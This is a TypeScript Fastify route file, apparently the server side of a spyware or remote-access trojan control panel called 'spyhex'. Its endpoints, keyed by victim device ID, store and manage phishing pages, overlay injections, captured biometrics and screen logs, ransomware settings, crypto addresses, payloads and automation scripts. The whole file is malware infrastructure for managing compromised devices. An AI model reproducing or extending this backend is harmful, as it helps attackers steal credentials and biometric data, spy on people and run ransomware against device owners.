import type { FastifyInstance } from 'fastify';
import { getDb } from '../db/index.js';
import {
  phishlets, injections, biometrics, screenlogs,
  toolkitConfig, ransomwareConfig, addresses,
  automataScripts, syringePayloads, aiAnalysis,
  firewallRules, pushNotifications, launchIntents,
  clients
} from '../db/schema.js';
import { eq, and, desc } from 'drizzle-orm';
import { log } from '../utils/logger.js';

export default async function spyhexRoutes(fastify: FastifyInstance) {
  // === PHISHLETS ===
  fastify.get('/phishlets', async (req, reply) => {
    const db = getDb();
    const rows = await db.select().from(phishlets).orderBy(desc(phishlets.createdAt));
    return { success: true, data: rows };
  });

  fastify.post('/phishlets', async (req, reply) => {
    const db = getDb();
    const body = req.body as any;
    const id = crypto.randomUUID();
    await db.insert(phishlets).values({ id, ...body });
    log.info(`Phishlet created: ${id}`);
    return { success: true, id };
  });

  fastify.delete('/phishlets/:id', async (req, reply) => {
    const db = getDb();
    const { id } = req.params as any;
    await db.delete(phishlets).where(eq(phishlets.id, id));
    return { success: true };
  });

  // === INJECTIONS ===
  fastify.get('/injections/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const rows = await db.select().from(injections).where(eq(injections.deviceId, deviceId));
    return { success: true, data: rows };
  });

  fastify.post('/injections', async (req, reply) => {
    const db = getDb();
    const body = req.body as any;
    const id = crypto.randomUUID();
    await db.insert(injections).values({ id, ...body });
    return { success: true, id };
  });

  fastify.patch('/injections/:id/toggle', async (req, reply) => {
    const db = getDb();
    const { id } = req.params as any;
    const row = await db.select().from(injections).where(eq(injections.id, id)).get();
    if (!row) return reply.code(404).send({ success: false, error: 'Not found' });
    await db.update(injections).set({ enabled: !row.enabled }).where(eq(injections.id, id));
    return { success: true, enabled: !row.enabled };
  });

  // === BIOMETRICS ===
  fastify.get('/biometrics/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const rows = await db.select().from(biometrics).where(eq(biometrics.deviceId, deviceId)).orderBy(desc(biometrics.createdAt));
    return { success: true, data: rows };
  });

  fastify.delete('/biometrics/:id', async (req, reply) => {
    const db = getDb();
    const { id } = req.params as any;
    await db.delete(biometrics).where(eq(biometrics.id, id));
    return { success: true };
  });

  // === SCREENLOGS ===
  fastify.get('/screenlogs/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const rows = await db.select().from(screenlogs).where(eq(screenlogs.deviceId, deviceId)).orderBy(desc(screenlogs.timestamp)).limit(100);
    return { success: true, data: rows };
  });

  // === TOOLKIT CONFIG ===
  fastify.get('/toolkit/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const row = await db.select().from(toolkitConfig).where(eq(toolkitConfig.deviceId, deviceId)).get();
    return { success: true, data: row || null };
  });

  fastify.post('/toolkit/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const body = req.body as any;
    const existing = await db.select().from(toolkitConfig).where(eq(toolkitConfig.deviceId, deviceId)).get();
    if (existing) {
      await db.update(toolkitConfig).set({ ...body, updatedAt: new Date() }).where(eq(toolkitConfig.deviceId, deviceId));
    } else {
      await db.insert(toolkitConfig).values({ id: crypto.randomUUID(), deviceId, ...body });
    }
    return { success: true };
  });

  // === RANSOMWARE CONFIG ===
  fastify.get('/ransomware/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const row = await db.select().from(ransomwareConfig).where(eq(ransomwareConfig.deviceId, deviceId)).get();
    return { success: true, data: row || null };
  });

  fastify.post('/ransomware/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const body = req.body as any;
    const existing = await db.select().from(ransomwareConfig).where(eq(ransomwareConfig.deviceId, deviceId)).get();
    if (existing) {
      await db.update(ransomwareConfig).set({ ...body }).where(eq(ransomwareConfig.deviceId, deviceId));
    } else {
      await db.insert(ransomwareConfig).values({ id: crypto.randomUUID(), deviceId, ...body });
    }
    return { success: true };
  });

  // === ADDRESSES ===
  fastify.get('/addresses/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const rows = await db.select().from(addresses).where(eq(addresses.deviceId, deviceId));
    return { success: true, data: rows };
  });

  fastify.post('/addresses', async (req, reply) => {
    const db = getDb();
    const body = req.body as any;
    const id = crypto.randomUUID();
    await db.insert(addresses).values({ id, ...body });
    return { success: true, id };
  });

  fastify.delete('/addresses/:id', async (req, reply) => {
    const db = getDb();
    const { id } = req.params as any;
    await db.delete(addresses).where(eq(addresses.id, id));
    return { success: true };
  });

  // === AUTOMATA ===
  fastify.get('/automata/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const rows = await db.select().from(automataScripts).where(eq(automataScripts.deviceId, deviceId));
    return { success: true, data: rows };
  });

  fastify.post('/automata', async (req, reply) => {
    const db = getDb();
    const body = req.body as any;
    const id = crypto.randomUUID();
    await db.insert(automataScripts).values({ id, ...body });
    return { success: true, id };
  });

  fastify.post('/automata/:id/run', async (req, reply) => {
    const db = getDb();
    const { id } = req.params as any;
    await db.update(automataScripts).set({ lastRun: new Date(), runCount: (await db.select().from(automataScripts).where(eq(automataScripts.id, id)).get())?.runCount || 0 + 1 }).where(eq(automataScripts.id, id));
    return { success: true };
  });

  // === SYRINGE ===
  fastify.get('/syringe/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const rows = await db.select().from(syringePayloads).where(eq(syringePayloads.deviceId, deviceId));
    return { success: true, data: rows };
  });

  fastify.post('/syringe', async (req, reply) => {
    const db = getDb();
    const body = req.body as any;
    const id = crypto.randomUUID();
    await db.insert(syringePayloads).values({ id, ...body });
    return { success: true, id };
  });

  // === AI ANALYSIS ===
  fastify.get('/ai-analysis/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const rows = await db.select().from(aiAnalysis).where(eq(aiAnalysis.deviceId, deviceId)).orderBy(desc(aiAnalysis.createdAt));
    return { success: true, data: rows };
  });

  fastify.post('/ai-analysis', async (req, reply) => {
    const db = getDb();
    const body = req.body as any;
    const id = crypto.randomUUID();
    await db.insert(aiAnalysis).values({ id, ...body });
    return { success: true, id };
  });

  // === FIREWALL ===
  fastify.get('/firewall/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const rows = await db.select().from(firewallRules).where(eq(firewallRules.deviceId, deviceId));
    return { success: true, data: rows };
  });

  fastify.post('/firewall', async (req, reply) => {
    const db = getDb();
    const body = req.body as any;
    const id = crypto.randomUUID();
    await db.insert(firewallRules).values({ id, ...body });
    return { success: true, id };
  });

  fastify.delete('/firewall/:id', async (req, reply) => {
    const db = getDb();
    const { id } = req.params as any;
    await db.delete(firewallRules).where(eq(firewallRules.id, id));
    return { success: true };
  });

  // === PUSH NOTIFICATIONS ===
  fastify.get('/push-notif/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const rows = await db.select().from(pushNotifications).where(eq(pushNotifications.deviceId, deviceId)).orderBy(desc(pushNotifications.createdAt));
    return { success: true, data: rows };
  });

  fastify.post('/push-notif', async (req, reply) => {
    const db = getDb();
    const body = req.body as any;
    const id = crypto.randomUUID();
    await db.insert(pushNotifications).values({ id, ...body });
    return { success: true, id };
  });

  // === LAUNCH INTENTS ===
  fastify.get('/launch-intents/:deviceId', async (req, reply) => {
    const db = getDb();
    const { deviceId } = req.params as any;
    const rows = await db.select().from(launchIntents).where(eq(launchIntents.deviceId, deviceId)).orderBy(desc(launchIntents.createdAt));
    return { success: true, data: rows };
  });

  fastify.post('/launch-intents', async (req, reply) => {
    const db = getDb();
    const body = req.body as any;
    const id = crypto.randomUUID();
    await db.insert(launchIntents).values({ id, ...body });
    return { success: true, id };
  });
}
